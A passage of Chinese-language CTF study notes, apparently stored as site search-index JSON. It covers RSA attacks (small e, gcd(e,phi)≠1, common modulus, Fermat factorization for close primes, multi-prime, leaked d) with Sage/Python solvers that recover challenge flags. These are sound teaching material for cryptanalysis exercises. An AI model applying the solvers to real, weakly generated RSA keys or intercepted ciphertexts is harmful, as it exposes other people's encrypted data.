b'r\\xd8lq+g\\xc8r\\x84\\x04\\xe2\\xc6i\\xb4\\\\?\\xb13\\xa9_[\\xa3\\x8b\\xcb\\xbd\\xbf\\xe6\\x95K)h\\xe1'\n# b'darctf{r@bln_a77@ck_e_2}'\n# b'\\xc2cj\\xe5\\xc3\\xd8\\xe4?\\x9768\\xa5\\x8e(\\x9f:+\\xa9\\x8a^\\xde\\x0f\\xb4\\x92\\xe7\\xb8\\x94\\x8a\\x1a^\\xfe`'\n# b'O\\x8a\\xfet\\x98q\\x1b\\xcdw\\x92\\xc8B\\x98\\xda\\xbel\\xba\\xd8Mm\\xe1\\xcd_\\xfej\\\\\\x19T4\\x94\\xc7\\xfc'\n</code></pre> <p>\u5f53\u7136\uff0csage \u4e2d\u5e94\u5f53\u662f\u5e2e\u6211\u4eec\u5185\u7f6e\u4e86\u8fd9\u4e48\u4e00\u4e2a\u7b97\u6cd5\uff0c\u6240\u4ee5\uff1a</p> mod(c, p).sqrt(all=True)<pre><code>from sage.all import *\nc = 55804540899466191494822903355151119222813727476411593093741269550876471676261\np = 275127860351348928173285174381581152299\nq = 319576316814478949870590164193048041239\nsqrt_c_p = Mod(c, p).sqrt(all=True)\nsqrt_c_q = Mod(c, q).sqrt(all=True)\nfor i in sqrt_c_p:\n    for j in sqrt_c_q:\n        m = crt([int(i), int(j)], [p, q])\n        from Crypto.Util.number import long_to_bytes\n        print(long_to_bytes(m))\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#e-3","title":"e = 3","text":"<p>\u5982\u679c \\(m^e &lt; n\\) \uff0c\u4ecd\u7136\u53ef\u4ee5\u76f4\u63a5\u5f00\u6839\uff1b\u4e0d\u7136\uff0c\u53ef\u4ee5\u7531 \\(m^e = kn+c\\) \uff0c\u5c1d\u8bd5\u7206\u7834 k \u5e76\u5c1d\u8bd5\u5f00 3 \u6b21\u6839\uff0c\u80fd\u5206\u89e3\u591a\u534a\u662f\u53ef\u884c\u89e3\uff1b\u4f46\u662f\u4e00\u822c\u6765\u8bf4\u82b1\u8d39\u65f6\u95f4\u6709\u70b9\u4e45\u3002</p> <p>\u5f53\u7136\uff0csage \u5e2e\u6211\u4eec\u65b9\u4fbf\u7684\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\uff08\u4e0b\u9762\u7684\u5206\u89e3\u7528\u65f6\u7ea6 3min \uff0c\u53ef\u89c1\u6548\u7387\u8fd8\u662f\u5f88\u4f4e\u7684\uff0c\u6bd5\u7adf\u8fd9\u91cc\u7684 n \u975e\u5e38\u5c0f\u4e86\uff09\uff1a</p> e = 3<pre><code>from sage.all import *\nn = 87924348264132406875276140514499937145050893665602592992418171647042491658461\ne = 3\npt = \"darctf{r@bln_a77@ck_e_2}\"\nm = int(pt.encode().hex(), 16)\nc = pow(m, e, n)\nprint(c) # 82453779934743057049976069612841272595880705095622841974484769483483076860419\n\nfrom Crypto.Util.number import *\nimport gmpy2\n\nc = 82453779934743057049976069612841272595880705095622841974484769483483076860419\nm = Mod(c, n).nth_root(e)\nprint(long_to_bytes(m)) # b'darctf{r@bln_a77@ck_e_2}'\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#gcde-phi-1","title":"gcd(e, phi) != 1","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#e-phi","title":"\u4e00\u7ec4 e, phi","text":"<p>\u4e00\u822c\u6765\u8bf4 \\(gcd(e, \\phi)=1\\) \u7684\uff0c\u4f46\u8981\u662f \\(gcd(e, \\phi)\\neq 1\\) \uff0c\u90a3\u4e48\u600e\u4e48\u505a\uff1fe=2/3/4 \u2026\u2026 \u7b49\u5341\u5206\u5c0f\u7684\u6570\u65f6\u540e\u9762\u53e6\u8bb2\uff0c\u8fd9\u91cc\u8003\u8651\u6bd4\u8f83\u4e00\u822c\u7684\u60c5\u51b5\u3002</p> <p>\u7531\u4e8e \\(gcd(e, \\phi)\\neq 1\\)\uff0c\u6b63\u5e38\u610f\u4e49\u4e0b\u7684\u79c1\u94a5 d \u662f\u4e0d\u5b58\u5728\u7684\uff0c\u4f46\u662f\u8003\u8651\u5230\u6b27\u62c9\u6269\u5c55\u5b9a\u7406\uff1a</p> <p>\u82e5 \\(gcd(e, \\phi) = b \\neq 1\\) \uff0c\u5219\u6709 \\(c = m^e = m^{ab}\\pmod{n} = m^{ab \\pmod{\\phi}}\\) \uff08\\(gcd(a, \\phi)=1\\)\uff0c\u5426\u5219 \\(gcd(e, \\phi)=1\\) \u4e0d\u6210\u7acb\uff09\uff1b\u53d6 \\(d = a^{-1}\\pmod{\\phi}\\)\uff0c\u5219\u6709 \\(c^d = m^{bad\\pmod{\\phi}} =  m^b\\pmod{n}\\)\uff1b\u6240\u4ee5\u53ea\u9700\u8981\u5bf9 \\(c^d\\pmod{\\phi}\\) \u5f00 b \u6b21\u6839\u5c31\u597d\u3002</p> <p>\u5f53\u7136\uff0c\u4e0d\u96be\u53d1\u73b0\uff0c\u54ea\u6015 \\(gcd(e, \\phi)=1\\) \uff0c\u4e0a\u8ff0\u8fc7\u7a0b\u4f9d\u7136\u9002\u7528\u3002</p> <pre><code>from sage.all import *\n\np= 127577058764408216374028752283743628765651360507566484643526093715329608267323381565274095814069864692746147152580906850350743742856555229701448239882612922698102985146366639955081466129923966803267071097174222576416224094182123529282235807472362341680183683025490897702891081336913842652559163341223338641607\nq= 156492273708587234539506501480609692085997989594717058472605523051244522493701609615085173280972894139427194976925940854142835807192417391269823151398439665817176522629246535810290194301862945052149450578938260979300632842291287807430486629994530805358742405299538986591596966945727494262182814875780600646003\ne= 750\nc= 7029383721249299532521086933490698266831518266762255492452526410777276825803657150303837084263410309063739203644435184397762022380085273363900423091223180151147964276354189658062571415744140073426572149093499560918765793389358300893454490774387180728097370701432534877005948330689495694820361726719418371072834639369078180094444137972424909816959445043108154884587947573054460257114169961823509538355580857411319157089278918107229480661280354242839678709689654304688727345294473487201644985815128413154870914132135222144633969959773621933444285994038028721862094040876152694240238708737727034258171506516394913692187\n\nimport sympy\nn = p*q\nphi = (p-1)*(q-1)\nb = gcd(e, phi) # b = 6\na = e // b\nd = inverse_mod(a, phi)\nm_b = power_mod(c, d, n)\nm = Integer(m_b).nth_root(b)\nprint(bytes.fromhex(hex(m)[2:]))\n# b'flag{0e2f9add-31fd-4733-8f25-39297516f4e2}'\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#e-phi_1","title":"\u591a\u7ec4 e phi","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1agcd(e, phi) != 1\uff0cgcd(n1, n2) != 1</p> <p>\u7c7b\u4f3c\u4e8e\u6a21\u4e0d\u4e92\u7d20\uff0c\u6211\u4eec\u4ee4 p = gcd(n1, n2) \uff0c\u5219 q1 = n1//p, q2 = n2//p\uff0c\u5219\u6709\uff1a</p> \\[ \\begin{cases} c_1^{d_1}=m^b\\bmod q_1 \\\\  c_2^{d_2}=m^b\\bmod q_2 \\end{cases} \\implies m^b = crt([c_{1}^{d_{1}}\\%q_{1}, c_{2}^{d_{2}}\\% q_{2}], [q_{1}, q_{2}]) \\] <p>\u4f46\u662f\u53d1\u73b0\u6b64\u65f6\u6c42\u5f97\u7684 \\(m^b\\) \u5e76\u4e0d\u80fd\u76f4\u63a5\u5f00 b \u6b21\u6839<sup>1</sup>\uff1b\u4f46\u6362\u4e2a\u89d2\u5ea6\u770b\uff0c\u8fd9\u4e0d\u4e5f\u662f\u6211\u4eec\u5728\u89e3\u51b3\u7684 rsa \u95ee\u9898\u5417\uff1f\u73b0\u5728\u65b0\u7684\u5bc6\u6587\u662f<sup>2</sup> \\(c &lt;= m^b, n &lt;= q_{1}*q_{2}, e &lt;= b\\) \uff0c\u8fd9\u4e0d\u662f\u5c31\u89e3\u51b3\u4e86\u5417\uff1f</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#gcdephi1","title":"\u65b0\u7684 gcd(e,phi)=1","text":"<p>\u5982\u679c\u5728\u7ecf\u8fc7\u4e0a\u9762\u8f6c\u53d8\u540e\uff0c\u65b0\u7684 gcd(e, phi)=1 \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u662f\u6b63\u5e38\u7684 rsa \u4e86\uff0c\u4e14 n \u5df2\u7ecf\u5206\u89e3\u597d\uff1a</p> many_e_phi_1.py<pre><code>\"\"\"\nfrom Crypto.Util.number import *\nimport random\n# from secret import flag\nflag=''\ntable='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\npad=100-len(flag)\nfor i in range(pad):\n    flag+=random.choice(table).encode()\ne=343284449\nm=bytes_to_long(flag)\nassert m&gt;(1&lt;&lt;512)\nassert m&lt;(1&lt;&lt;1024)\np=getPrime(512)\nq=getPrime(512)\nr=getPrime(512)\nprint('p=',p)\nprint('q=',q)\nprint('r=',r)\nn1=p*q\nn2=q*r\nc1=pow(m,e,n1)\nc2=pow(m,e,n2)\nprint('c1=',c1)\nprint('c2=',c2)\n\"\"\"\n\nfrom sage.all import *\n\ne = 343284449\np = 11820891196647569262137841192985418014377132106496147254821784946481523526822939129065042819464351666077658751406165276121125571355594004514547517855730743\nq = 10450390015864176713581330969519712299844487112687677452105216477861582967322473997670559995588440097951786576039009337782247912476227937589298529580432797\nr = 9484954066160968219229920429258150817546418633451929876581842443665029377287119340232501682142185708534413073877473741393278935479791561681402673403009771\n\nc1 = 69574855207460025252857869494766338442370688922127811393280455950372371842144946699073877876005649281006116543528211809466226185922844601714337317797534664683681334132261584497953105754257846471069875622054326463757746293958069752489458646460121725019594141157667480846709081917530190233900184428943585065316\nc2 = 66183492015178047844987766781469734325646160179923242098082430373061510938987908656007752256556018402101435698352339429316390909525615464024332856855411414576031970267795270882896721069952171988506477519737923165566896609181813523905810373359029413963666924039857159685161563252396502381297700252749204993228\n\n# \u9a8c\u8bc1\u53ef\u884c\u7684\u5fc5\u8981\u6761\u4ef6\nphi1 = (p - 1) * (q - 1)\nphi2 = (q - 1) * (r - 1)\nb1 = gcd(e, phi1)\nb2 = gcd(e, phi2)\nassert b1 == b2\na1 = e // b1\na2 = e // b2\nb = b1 # \u7528 b \u7edf\u4e00\u4ee3\u66ff\uff0cb = 343284449 == e\n\n# \u6c42\u89e3\nd1 = pow(a1, -1, phi1)\nd2 = pow(a2, -1, phi2)\nc = crt([pow(c1,d1,p), pow(c2,d2,r)], [p, r]) # == m^b\nn = p * r # \u65b0\u7684 n\n\nphi = (p - 1) * (r - 1)\nd = pow(b, -1, phi)\nm = pow(c, d, n)\nprint(bytes.fromhex(hex(m)[2:])) # b'moectf{Th1s_iS_Chinese_rEm41nDeR_The0rEm_CRT!}YWMZSTyfRvhjTCJuQCwALQBcWHFCgTDIZWJaxRUzBPCmFOnbDTRBau'\n</code></pre> <p>Extra</p> <p>\u5f53\u4f7f\u7528\u7684 e \u76f8\u540c\u65f6\uff0c\u5176\u5b9e\u4e0d\u96be\u5f97\u5230\uff1a\\(\\begin{cases}m^e =c_{1}\\pmod{n_{1}}\\\\ m^e=c_{2}\\pmod{n_{2}}\\end{cases}\\)\uff0c\u4f7f\u7528 sagemath \u4e2d\u7684 CRT_list() \u65b9\u6cd5\u53ef\u4ee5\u5f88\u5feb\u7684\u6c42\u89e3\u5230 \\(m^e \\pmod{p*q*r}\\) \uff0c\u53ef\u4ee5\u9a8c\u8bc1\u8fd9\u6837\u83b7\u5f97\u503c\u7b49\u4e8e \\(pow(m,e,p*q*r)\\)\uff1b\u4f46\u662f\u6a21\u6570\u592a\u5927\u4e86\uff0c\u96be\u4ee5\u5206\u89e3\uff1b\u5373\u4f7f\u662f\u5f88\u5c0f\u7684 e (e = 2) \u6211\u4e5f\u6ca1\u80fd\u5206\u89e3\u51fa\u6765\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#gcde-phi1","title":"\u65b0\u7684 gcd(e, phi)!=1","text":"<p>\u8981\u662f\u65b0\u4ea7\u751f\u7684 gcd(e,phi)!=1 \uff0c\u5c31\u8f6c\u53d8\u4e3a\u4e86 \u4e00\u7ec4 e, phi \u7684\u60c5\u51b5\u4e86\uff1a</p> many_e_phi_2.py<pre><code>from sage.all import *\ne1 = 14606334023791426\nn1 = 15848477716099753229061105911923143022389100496585807518993837576102534462043194116619385857927748061397249782381439885030297281760313655984354167005661008888718357134674249156614681638863679015479391847068348113489701337473262927808261967350366795633795543505703845606067045115243249537229108546272131429244457163342256387732236996418260843007569149387213329951406657469770618225877026401261848714538526688419134479943104911077402172330808220738139303070470120465456908824191640348115644774893040473576807682731982391129182748695821091864850237701682483798458814537415464726492081290583865419431028569430363239973387 \n\nc1 = 11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248\n\ne2 = 13813369129257838\nn2 = 11445377519264375060023079150962157833890568553640391338775989472330549038258150532468931626590818889296627067314268489584599131270267459828529179275532395041458525655212071679524344189181556827177841274953525505205469905975591164796436528919538933755927696086719287398795598052871568671842946947271918760899756232697968504961711410196730301840362369205729432748105709812801671538869541242955495144296736011715597473451149699457286420032252438757033057264819071583173255215409033569426653382271461349576578652124917074830516189769868866985581229557115992762278225013198895683154925091608336698625404745349624865012491\nc2 = 7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919\n\n\"\"\" solve \"\"\"\n\np = gcd(n1, n2)\nq1, q2 = n1 // p, n2 // p\nphi1, phi2 = (p-1)*(q1-1), (p-1)*(q2-1)\nb1 = gcd(e1, phi1)\nassert b1==gcd(e2, phi2)\n\na1, a2 = e1 // b1, e2 // b1\nd1, d2 = inverse_mod(a1, phi1), inverse_mod(a2, phi2)\nc1d1, c2d2 = power_mod(c1, d1, q1), power_mod(c2, d2, q2)\nm_b1 = crt([c1d1, c2d2], [q1, q2])\n\n# \u6309\u7167\u53ea\u6709\u4e00\u7ec4 e phi \u7684\u65b9\u6cd5\u7ee7\u7eed\u505a\uff0cn = q1*q2, e = b1\nn = q1 * q2\nphi = (q1-1) * (q2-1)\nb2 = gcd(b1, phi)\na = b1 // b2\nd = inverse_mod(a, phi)\nm_b2 = power_mod(m_b1, d, n)\nm = Integer(m_b2).nth_root(b2)\nprint(bytes.fromhex(hex(m)[2:])) # b\"flag{gcd_e&amp;\\xcf\\x86_isn't_1}\"\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_6","title":"\u6a21\u6570\u653b\u51fb","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#n","title":"N \u592a\u5c0f/\u88ab\u516c\u5f00","text":"<p>Question</p> <p>CryptoHack \u2013 RSA challenges Everything is Big</p> <p>\u9898\u76ee\u4e2d\u7ed9\u51fa\u4e86\u5f88\u5927\u7684 N\uff0c\u4f46\u662f\u653e\u5230 factordb.com \u4e2d\uff0c\u5206\u89e3\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\uff1b\u6216\u8005\u5bf9\u4e8e\u6bd4\u8f83\u5c0f\u7684 N\uff0csage math \u7684 factor \u4e4b\u7c7b\u7684\u90fd\u53ef\u4ee5\u5206\u89e3\u3002</p> <p>\u5206\u89e3\u4e3a factors \u5982\u4e0b\uff1a</p> <pre><code>from Crypto.Util.number import *\ne = 0x9ab58dbc8049b574c361573955f08ea69f97ecf37400f9626d8f5ac55ca087165ce5e1f459ef6fa5f158cc8e75cb400a7473e89dd38922ead221b33bc33d6d716fb0e4e127b0fc18a197daf856a7062b49fba7a86e3a138956af04f481b7a7d481994aeebc2672e500f3f6d8c581268c2cfad4845158f79c2ef28f242f4fa8f6e573b8723a752d96169c9d885ada59cdeb6dbe932de86a019a7e8fc8aeb07748cfb272bd36d94fe83351252187c2e0bc58bb7a0a0af154b63397e6c68af4314601e29b07caed301b6831cf34caa579eb42a8c8bf69898d04b495174b5d7de0f20cf2b8fc55ed35c6ad157d3e7009f16d6b61786ee40583850e67af13e9d25be3\nc = 0x3f984ff5244f1836ed69361f29905ca1ae6b3dcf249133c398d7762f5e277919174694293989144c9d25e940d2f66058b2289c75d1b8d0729f9a7c4564404a5fd4313675f85f31b47156068878e236c5635156b0fa21e24346c2041ae42423078577a1413f41375a4d49296ab17910ae214b45155c4570f95ca874ccae9fa80433a1ab453cbb28d780c2f1f4dc7071c93aff3924d76c5b4068a0371dff82531313f281a8acadaa2bd5078d3ddcefcb981f37ff9b8b14c7d9bf1accffe7857160982a2c7d9ee01d3e82265eec9c7401ecc7f02581fd0d912684f42d1b71df87a1ca51515aab4e58fab4da96e154ea6cdfb573a71d81b2ea4a080a1066e1bc3474\nfactors = [134669927709128070756424801419548805501808076912262801434800605920827612464368906595661348393409080650056282638489243851059781971132159889896843018381187994628859917822755789986092763460463295405651440816348815008245093856412009397970192375577360567873185141159375280522236909060526334123001733587717969177157, 173121513995818161102245832683211062320154182361182024148671930683926870711405647497524667705258311163551127156955342410807842326402024536548989691926348678692995530897791794818646241971728281417961389048493180792474943296919266335463768525410560161755731138916915767148609523790355387780727531897114371948649]\n\nphi = (factors[0] - 1) * (factors[1] - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, N)\nprint(bytes.fromhex(hex(m)[2:]).decode()) # crypto{s0m3th1ng5_c4n_b3_t00_b1g}\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#roll","title":"Roll \u6309\u884c\u52a0\u5bc6","text":"<p>\u7c7b\u4f3c\u4e8e\u5206\u7ec4\u52a0\u5bc6\uff0c\u5206\u522b\u89e3\u5bc6\u4e4b\u540e\u6062\u590d\u5373\u53ef\u3002</p> <pre><code>from sage.all import *\nfrom Crypto.Util.number import *\n\nn=920139713\ne=19\nc=[704796792,752211152,274704164,18414022,368270835,483295235,263072905,459788476,483295235,459788476,663551792,475206804,459788476,428313374,475206804,459788476,425392137,704796792,458265677,341524652,483295235,534149509,425392137,428313374,425392137,341524652,458265677,263072905,483295235,828509797,341524652,425392137,475206804,428313374,483295235,475206804,459788476,306220148]\n\nphi = euler_phi(n)\nd = inverse_mod(e,phi)\nflag=\"\"\nfor i in c:\n  m=long_to_bytes(pow(i,d,n))\n  flag=flag+m.decode()#decode\u8fd4\u56de\u5b57\u7b26\u4e32\nprint(flag)\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_7","title":"\u6a21\u4e0d\u4e92\u7d20","text":"<p>\u6a21\u4e0d\u4e92\u7d20\u662f\u6307\uff1a\u591a\u6b21\u7ed9\u51fa\u7684 n \u4e0d\u4e92\u7d20\uff0c\u90a3\u4e48\u4f7f\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u89e3\u516c\u56e0\u6570\u540e\u4e24\u4e2a\u90fd\u53ef\u4ee5\u5206\u89e3\uff0c\u4ece\u800c\u88ab\u7834\u89e3\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#rsa","title":"\u591a\u7d20\u6570 RSA","text":"<p>n \u80fd\u591f\u5206\u89e3\u4e3a\u591a\u4e2a\u7d20\u6570\uff0c\u90a3\u4e48\u5206\u89e3\u96be\u5ea6\u76f8\u5bf9\u8f83\u4f4e\uff0c\u5206\u89e3\u540e\u6c42\u89e3\u6b27\u62c9\u51fd\u6570\u5373\u53ef\u3002</p> <p>Question</p> <p>CryptoHack \u2013 RSA challenges Manyprime</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u516c\u5f0f\u5bfb\u627e phi \uff1a</p> manyPrime<pre><code>def manyPrime(n):\n    from sage.all import *\n    n = Integer(n)\n    factors = factor(n)\n    phi=1\n    for i in factors:\n        phi *= (i[0]-1)*(i[0]**(i[1]-1))\n    return phi\n</code></pre> <p>\u5f53\u7136 sagemath \u4e2d\u5185\u7f6e\u4e86 <code>euler_phi()</code> \u65b9\u6cd5\u76f4\u63a5\u5bfb\u627e\u3002</p> <p>Tip</p> <p>\u6709\u65f6\u4f7f\u7528 factordb \u5206\u89e3\u5927\u6570\uff0c\u53d1\u73b0\u80fd\u591f\u5206\u89e3\u51fa\u4e00\u4e9b\u5c0f\u6570\uff0c\u4f46\u662f\u5269\u4e0b\u6700\u5927\u7684\u90a3\u4e2a\u6570\u4f9d\u65e7\u4e0d\u662f\u8d28\u6570\u3002\u5982\u679c\u5df2\u7ecf\u5206\u89e3\u51fa\u6765\u7684\u90e8\u5206\u7684\u4e58\u79ef\u5927\u4e8e m\uff0c\u90a3\u4e48\u4e5f\u591f\u7528\u4e86\u3002</p> <p>\u4f8b\u5982\uff0c\u5f53\u524d\u5df2\u7ecf\u5206\u89e3 \\(n = a*....*b * A\\) \u4e14 \\(is\\_prime(A)==False\\)\uff0c\u90a3\u4e48\u6211\u4eec\u8bb0 \\(a*\\dots*b = k, \\phi(k)\\) \u662f\u4e0d\u96be\u8ba1\u7b97\u7684\u3002\u5982\u679c m &lt; k\uff0c\u5219\u6709 \\(m=c^{d_n}\\pmod{n} = c^{d_{k}}\\pmod{k}\\) \u5176\u4e2d \\(d_x\\) \u8868\u793a\u5728\u6a21 x \u7684\u60c5\u51b5\u4e0b e \u7684\u9006\u5143\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_8","title":"\u5171\u6a21\u653b\u51fb","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1a\u4f7f\u7528\u76f8\u540c\u7684 n\uff0c\u4e0d\u540c\u7684 e \u5bf9\u540c\u4e00\u6bb5\u5bc6\u6587\u8fdb\u884c\u4e86\u4e24\u6b21\u52a0\u5bc6\u4e14 gcd(e1, e2)=1\u3002</p> <p>\u82e5 gcd(e1, e2)=1\uff0c\u7531\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u5f97 s1e1+s2e2 = 1 (mod n)\uff0c\u6545\u6709</p> \\[ \\begin{cases} c_{1} = m^{e_{1}}\\pmod{n} \\\\ c_{2} = m^{e_{2}}\\pmod{n} \\end{cases} \\implies c_{1}^{s_{1}}*c_{2}^{s_{2}} = m^{s_{1}e_{1}+s_{2}e_{2}} = m \\pmod{n} \\] same module problem<pre><code>from sage.all import *\nfrom Crypto.Util.number import *\npt = \"darctf{D0n't_uS@_s4me_m_wlth_s@m3_n}\"\nm = bytes_to_long(pt.encode())\np = getPrime(512)\nq = getPrime(512)\nn = p*q\ne1 = 0x10001\ne2 = 0x10003\nc1 = pow(m,e1,n)\nc2 = pow(m,e2,n)\nprint(n, c1, c2)\n</code></pre> same module solver<pre><code>n, c1, c2 = 98579989110595409237121911373477535218782298101063142983736645609805239388519112976391020979766081600973756603466949088252537954226386662303812158399922085551030673235391122690690489614742213805086900032298294111577763523768897971988558981215342244298264282081994037439494627023764742694360182589392496394219, 72425280162325234030138440618893638248350200498036366062366806318799000892558826781676354721574015025260601419134051722219497286707335137576108567308732036645624100301827935632352883927544186998800800613763615685859542808865932240404766516153255982736474238236663712354416704416640104545540927957772848234809, 93315981548035764166225288143368979083298522822532493540407786336594222729430799616658596163211870306390452369608572159579771439267416866701746284141500177829084900908267884433644532039697396467417361020676970648165967089856122514452470159341424342038954503503377562938855963571013967607308287570236674707243\ne1, e2 = 0x10001, 0x10003\ns,s1,s2 = xgcd(e1,e2)\nm = mod(power_mod(c1,s1,n)*power_mod(c2,s2,n), n)\nprint(long_to_bytes(int(m))) # b\"darctf{D0n't_uS@_s4me_m_wlth_s@m3_n}\"\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#p-q","title":"p &amp; q \u9009\u53d6\u4e0d\u5f53","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#p-q_1","title":"|p-q| \u8f83\u5c0f","text":"<p>CTF Wiki (ctf-wiki.org)</p> <p>\u5e38\u89c1\u7684\u60c5\u51b5\u6709 <code>q = next_prime(p)</code> \u5bfc\u81f4\u4e8c\u8005\u975e\u5e38\u63a5\u8fd1\u3002</p> <p>Question</p> <p>CryptoHack \u2013 RSA challenges Infinite Descent</p> small_p_min_q<pre><code>from sage.all import *\nn = ...\ne = 65537\nc = ...\n\ndef small_p_min_q(n):\n    a = ceil(nth_root(n, 2))\n    b = a**2 - n\n    while not is_square(b):\n        a += 1\n        b = a**2 - n\n\n    c = nth_root(b, 2)\n    return a-c, a+c\n\np, q = small_p_min_q(n)\n# print(p, q)\nphi = (p-1)*(q-1)\nd = inverse_mod(e, phi)\nm = power_mod(c, d, n)\nfrom Crypto.Util.number import *\nprint(long_to_bytes(m)) # b'crypto{f3rm47_w45_4_g3n1u5}'\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#n-npnq","title":"n &amp; npnq","text":"<p>\u5076\u7136\u95f4\u505a\u5230\u8fd9\u4e48\u4e00\u4e2a\u9898\uff0c\u7ed9\u6211 e, n, c \u4e4b\u5916\uff0c\u8fd8\u7ed9\u6211 npnq\uff0c\u5176\u4e2d <code>n == p*q and npnq = next_prime(p)*next_prime(q)</code></p> <p>\u6211\u4eec\u8bb0 \\(npnq = np*nq\\) \uff0c\u5219\u4f1a\u53d1\u73b0\uff1a<code>p*nq - q*np</code> \u5f88\u5c0f\uff01\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0a\u9762\u8bb2\u7684\u65b9\u6cd5\u5206\u89e3 <code>n*npnq</code> \uff0c\u5982\u679c\u80fd\u591f\u5f97\u5230 \\(p1 = p*nq\\) \uff0c\u5219\u6709 \\(p = gcd(n, p_{1})\\) \uff0c\u8fd9\u6837 n \u5c31\u5206\u89e3\u51fa\u6765\u4e86\u3002</p> <p>\u7531\u4e8e \\(n*npnq = p*q * np * nq = p * nq * q * np\\) \uff0c\u6240\u4ee5\u88ab\u5206\u89e3\u4e3a\u54ea\u79cd\u60c5\u51b5\u5e76\u4e0d\u80fd\u786e\u4fdd\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u591a\u4fdd\u7559\u51e0\u7ec4\uff1b\u5f53\u7136\uff0c\u8003\u8651\u5230 \\(|p*nq - q*np| &lt; |np * nq - p*q|\\)\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u7b2c\u4e00\u4e2a\u89e3\u5e94\u8be5\u662f\u6211\u4eec\u60f3\u8981\u7684\u3002</p> fematFactorization<pre><code>def fematFactorization(n, k=1) -&gt; list:\n    \"\"\"n == p*q &amp;&amp; |p-q| is small\"\"\"\n    from gmpy2 import iroot, is_square\n    from itertools import count\n\n    factors_list = []\n    a = iroot(n, 2)[0]\n    b_2 = a**2 - n\n    for a in count(a):\n        b_2 = a**2 - n\n        if b_2 &lt; 0:\n            continue\n        b = iroot(b_2, 2)[0]\n        if a ** 2 - b ** 2 == n:\n            factors_list.append((a-b, a+b))\n        if len(factors_list) == k:\n            return factors_list\n\n##### demo case #####\nfrom sage.all import random_prime, next_prime, gcd, inverse_mod\nm = int(b\"darctf{_f3m4t_f4c70r1z4t10n_1s_s0_e4sy}\".hex(), 16)\nprint(m)\np = random_prime(1 &lt;&lt; 1024, lbound=1 &lt;&lt; 1023)\nq = random_prime(1 &lt;&lt; 1024, lbound=1 &lt;&lt; 1023)\nn = p * q\nnpnq = next_prime(p) * next_prime(q)\ne = 0x10001\nc = pow(m, e, n)\nprint(c, n, npnq, sep='\\n')\nfactors_list = fematFactorization(n * npnq, k=2) # \u9884\u9632\u5206\u89e3\u540e\u5bf9\u5e94\u7ed3\u679c\u4e3a n &amp; npnq \u800c\u65e0\u6548\n\nfor p1, q1 in factors_list:\n    assert p1 * q1 == n * npnq\n    p, q = gcd(p1, n), gcd(q1, n)\n    assert p * q == n\n    phi = (p - 1) * (q - 1)\n    try:\n        d = inverse_mod(e, phi)\n        m = pow(c, d, n)\n        print(bytes.fromhex(hex(m)[2:]))\n    except Exception as error:\n        print(\"Error:\", error)\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#rsa-backdoor-4p-1-method","title":"RSA backdoor (4p-1 method)","text":"<p>\u653b\u51fb\u6761\u4ef6\uff1a\\(4p-1 = Ds^2\\) \u5176\u4e2d Ds \u53c2\u89c1 cm_factorization \u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_9","title":"\u79c1\u94a5\u653b\u51fb","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#d","title":"d \u6cc4\u9732\u653b\u51fb","text":"<p>\u5f53\u5bf9\u5e94\u7684 (e,d) \u6cc4\u9732\u540e\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u5206\u89e3\u5bf9\u5e94\u7684 N \u3002\u5177\u4f53\u539f\u7406\u53ef\u89c1 ctf-wiki \u3002</p> <p>rsatool calculates RSA (p, q, n, d, e) and RSA-CRT (dP, dQ, qInv) parameters given either two primes (p, q) or modulus and private exponent (n, d).</p> 